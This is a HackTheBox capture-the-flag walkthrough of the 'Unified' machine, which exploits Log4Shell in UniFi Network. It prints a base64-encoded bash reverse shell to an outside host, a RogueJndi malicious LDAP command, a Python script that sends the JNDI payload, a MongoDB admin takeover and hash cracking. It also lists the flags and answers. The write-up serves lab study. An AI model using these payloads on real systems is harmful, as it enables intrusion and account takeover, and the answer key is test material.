TITLE: Unified
CATEGORY: HackTheBox
DATE: 2026-05-10
IMAGE: ./assets/Unified.png
---

# Unified

Unified is a very easy Linux machine that demonstrates the exploitation of the Log4Shell (CVE-2021-44228) vulnerability in the UniFi Network application. 

## Recon

Nmap reveals ports 22, 6789, 8080, 8443, 8843, and 8880 are open.

```bash
 nmap -sV -sC -p- 10.129.96.149 -min-rate 5000 -T4 -v -o nmap_scan
```

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 6789 | ibm-db2-admin | - |
| 8080 | HTTP | Apache Tomcat |
| 8443 | SSL/Nagios-NSCA | UniFi Network 6.4.54 |
| 8843 | SSL/HTTP | Apache Tomcat |

Visiting `https://10.129.96.149:8443/status` confirms the server version:

```json
 {
    "meta": {
        "rc": "ok",
        "up": true,
        "server_version": "6.4.54",
        "uuid": "8918a2b4-6f90-4f13-8233-e29085bd16d7"
    },
    "data": []
}
```

## Exploitation

### Log4Shell (CVE-2021-44228)

The UniFi Network application version 6.4.54 is vulnerable to Log4Shell. We can trigger the vulnerability by sending a malicious JNDI payload in the `remember` or `username` field of the login request.

First, we prepare a reverse shell payload and encode it in base64:

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.15.216/4444 0>&1' | base64
# YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjE2LzQ0NDQgMD4mMQo=
```

Then, we start `RogueJndi` to act as a malicious LDAP server:

```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjE2LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.216"
```

Next, we run a Python script to trigger the login request with the JNDI payload:

```python
import requests
import urllib3

# Disable insecure request warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login():
    url = "https://10.129.145.249:8443/api/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json; charset=utf-8",
        "Referer": "https://10.129.145.249:8443/manage/account/login?redirect=%2Fmanage",
        "Origin": "https://10.129.145.249:8443",
        "Connection": "keep-alive"
    }
    payload = "${jndi:ldap://10.10.15.216:1389/o=tomcat}"
    data = {
        "username": payload,
        "password": "password",
        "remember": payload,
        "strict": True
    }
    
    print(f"Sending request to {url} with payload...")
    
    try:
        response = requests.post(url, headers=headers, json=data, verify=False)
        print(f"Status Code: {response.status_code}")
        print("Response Text (truncated):", response.text[:200])
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    login()
```

While the Python script is running, we listen for the reverse shell:

```bash
nc -lvnp 4444
```

After obtaining the shell, we find the user flag:

```bash
whoami
# unifi
find / -name "user.txt" 2>/dev/null
# /home/michael/user.txt
cat /home/michael/user.txt
# 6ced1a6a89e666c0620cdb10262ba127
```

## Post-Exploitation

### MongoDB Manipulation

After gaining a shell, we can see that MongoDB is running locally on port 27117.

```bash
ps aux | grep mongo
# unifi         67  0.2  4.2 1100672 86560 ?       Sl   13:27   0:32 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 ...
```

We can connect to the `ace` database using the `mongo` shell.

```bash
mongo --port 27117 ace
```

Inside the MongoDB shell, we can list the administrators:

```javascript
db.admin.find().forEach(printjson)
```

To take control of the application, we can generate a new SHA-512 hash and insert a new administrator user into the database.

First, on our local machine, we generate a hash for the password "password":

```bash
mkpasswd -m sha-512 password 
# $6$A5pujhFRxsU1otlQ$iVW4ShCqIrwr1D9.8TzPRh9oOhGMgqTflXGX5o8LIJl0rSLtMUdarbYsbBAq2XkY1KSU.IZnGJF6ASWr44nJ2.
```

Then, in the MongoDB shell, we insert a new user or update an existing one:

```javascript
// To insert a new user
db.admin.insert({
    "email": "mrmo7ox@mrmo7ox.com", 
    "name": "mrmo7ox", 
    "x_shadow": "$6$A5pujhFRxsU1otlQ$iVW4ShCqIrwr1D9.8TzPRh9oOhGMgqTflXGX5o8LIJl0rSLtMUdarbYsbBAq2XkY1KSU.IZnGJF6ASWr44nJ2."
})

// To update the existing administrator's password
db.admin.update(
  { "name" : "administrator" }, 
  { $set : { "x_shadow" : "$6$A5pujhFRxsU1otlQ$iVW4ShCqIrwr1D9.8TzPRh9oOhGMgqTflXGX5o8LIJl0rSLtMUdarbYsbBAq2XkY1KSU.IZnGJF6ASWr44nJ2." } }
)
```

We can verify the insertion by running `db.admin.find().forEach(printjson)` again.

### Root Access

After updating the administrator password, we can log in to the UniFi web interface at `https://10.129.145.249:8443/`. 

Once logged in, navigating to **Settings -> Site** reveals the **Device Authentication** section. Here we can find the SSH credentials for the managed devices:

- **Username:** `root`
- **Password:** `NotACrackablePassword4U2022`

We can use these credentials to access the machine via SSH:

```bash
ssh root@10.129.145.249
# Password: NotACrackablePassword4U2022
```

After logging in as root, we can retrieve the root flag:

```bash
cat /root/root.txt
# e50bc93c75b634e4b272d2f771c33681
```

### Cracking Captured Hashes

### Cracking Captured Hashes

If we want to crack existing hashes, we can use `john`. For example, to crack the administrator's hash:

```bash
echo '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.' > hash.txt
john hash.txt
```
## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | Which are the first four open ports? | `22, 6789, 8080, 8443` |
| 2 | What is the title of the software that is running on port 8443? | `UniFi Network` |
| 3 | What is the version of the software that is running? | `6.4.54` |
| 4 | What is the CVE for the identified vulnerability? | `CVE-2021-44228` |
| 5 | What protocol does JNDI leverage in the injection? | `LDAP` |
| 6 | What tool do we use to intercept the traffic, indicating the attack was successful? | `tcpdump` |
| 7 | What port do we need to inspect intercepted traffic for? | `389` |
| 8 | Submit user flag | `6ced1a6a89e666c0620cdb10262ba127` |
| 9 | What port is the MongoDB service running on? | `27117` |
| 10 | What is the default database name for UniFi applications? | `ace` |
| 11 | What is the function we use to enumerate users within the database in MongoDB? | `db.admin.find()` |
| 12 | What is the function we use to update users within the database in MongoDB? | `db.admin.update()` |
| 13 | What is the password for the root user? | `NotACrackablePassword4U2022` |
| 14 | Submit root flag | `e50bc93c75b634e4b272d2f771c33681` |
